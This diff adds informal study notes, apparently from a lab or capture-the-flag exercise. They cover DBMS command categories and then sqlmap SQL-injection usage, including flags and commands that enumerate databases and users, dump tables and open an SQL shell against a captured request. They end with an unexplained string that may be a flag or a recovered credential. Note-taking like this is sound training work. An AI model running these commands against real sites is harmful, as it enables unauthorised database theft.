@@ -1,0 +1,40 @@
+
+From geeks for geeks
+DBMS - database management systm
+DDL collectin of commands which deals with database schemas and descriptions. How the data whould reside in the database: CREATE ALTER RENAME TRUNCATE DROP COMMENT
+DML Data Maniplation Language, Deals with data manipulation and includes the most common statements: SELECT INSERT UPDATE DELETE MERGE CALL 
+DCL data control language, used to change perms: GRANT REVOKE	
+TCL Transaction Control language, manages transactional data: COMMIT ROLLBACK SAVEPOINT
+
+
+Is either relational or nonrelationl. 
+Realtional is organized in the form of tables, each table has a set or rows and collums
+NoSql is in the rom of key-value pares, docuemtns, graphs or colums based.
+
+sqlmap -h (-hh advanced help)
+
+-u URl
+--data=DATA - string to be sent throug POST eg id=1
+
+--dump dump DMBS table entries
+--schema Enumerate DBMS schema
+-D allows you to select database name
+
+--wizard
+--sql-shell Prompt for interactive SQL Shell
+-o turn on all optomize options
+--dbms=mysql force mysql
+
+
+Simple HTTP GET based test
+sqlmap -h https://testsite.com/page.php?id=7
+
+after capture of text
+sqlmap -r bcap.txt -p blood_group --dbs
+
+FROM HERE I RAN SOME ENUMS
+--users
+--current-user
+--dump
+
+FrgeG7YGmUKQww
